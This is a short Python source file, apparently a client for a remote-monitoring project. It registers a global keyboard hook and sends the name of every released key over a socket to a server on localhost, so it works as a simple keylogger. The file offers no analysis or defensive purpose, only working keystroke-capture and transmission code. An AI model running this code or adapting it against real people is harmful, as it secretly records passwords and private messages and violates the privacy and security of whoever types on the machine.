import socket
import keyboard
import protocol
import server_manage

port = server_manage.KEYBOARD_PORT

def start_log():
    keyboard.on_release(callback=callback)
    keyboard.wait()
    
def callback(event):
    button = event.name
    protocol.send(my_socket, button.encode())

def main():
    global my_socket
    my_socket = socket.socket()
    my_socket.connect(("127.0.0.1", port))
    print("connected")
    start_log()
    my_socket.close()
    print("end")

if __name__ == "__main__":
    main()